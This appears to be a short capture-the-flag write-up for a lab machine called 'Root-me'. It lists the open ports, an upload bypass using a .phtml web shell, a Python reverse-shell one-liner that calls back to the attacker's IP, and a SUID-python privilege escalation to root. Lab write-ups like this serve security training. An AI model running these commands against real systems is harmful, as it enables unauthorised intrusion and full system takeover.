# Root-me

### IP: 10.10.56.153

### PORTS
- 22
- 80

### 80
- Apache v2.4.29
- /uploads, /css, /js
- /panel

/panel is a simple file upload server, uploaded files are accessible at /uploads

### /panel
- php file are not allowed, uploaded `shell.phtml`
- used this cmd to get a revshell, ran it through `shell.phtml` on web
```
export RHOST="my ip";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
- ran linpeas.sh
- suid bit for /usr/bin/python is set
- used this cmd from GTFOBin to get a root shell
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
